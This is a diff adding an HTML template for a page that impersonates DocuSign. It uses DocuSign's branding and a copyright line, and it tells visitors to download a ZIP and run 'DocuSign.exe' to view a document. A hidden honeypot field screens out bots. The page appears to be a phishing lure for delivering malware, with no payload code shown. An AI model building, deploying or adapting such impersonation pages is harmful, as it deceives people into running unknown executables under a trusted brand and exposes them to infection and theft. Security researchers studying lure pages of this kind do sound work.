@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DocuSign</title>
+    <link rel="stylesheet" href="../static/styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <nav class="navbar">
+            <div class="logo">
+                <img src="{{url_for('static',filename='docusign-logo.png')}}" alt="DocusignLogo" >
+            </div>
+          
+        </nav>
+
+        <div class="download-content">
+            <div class="desktop-image">
+                <img src="{{url_for('static',filename='desktop-logo.png')}}" alt="Desktop Image">
+            </div>
+            <div class="download-instructions">
+                <h2>Download Docusign to view the document</h2>
+                <div class="instructions">
+                    <ol>
+                        <li>Download the Docusign package.</li>
+                        <li>Locate and open the downloaded ZIP file.</li>
+                        <li>Extract all the files to a new folder.</li>
+                        <li>Run the <strong>DocuSign.exe</strong> application form the extracted folder.</li>
+                        <li>Follow the on-screen promts to complete the installtion.</li>
+                    </ol>
+                </div>
+                <form action="/download" method="POST">
+                    <!-- CSRF protection token -->
+                    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+                    <!-- Honeypot field to block bots -->
+                    <input type="text" name="website" style="display:none;" tabindex="-1" autocomplete="off">
+                    <div class="download-btn">
+                        <button type="submit">Download DocuSign</button>
+                    </div>
+                </form>
+                    <p><strong>Requires docusign application for document access</strong></p>
+                </div>
+            </div>
+            
+        </div>
+        <footer class="footer">
+    <p>© 2026 DocuSign  All rights reserved.</p>
+</footer>
+    </div>
+</body>
+
+</html>
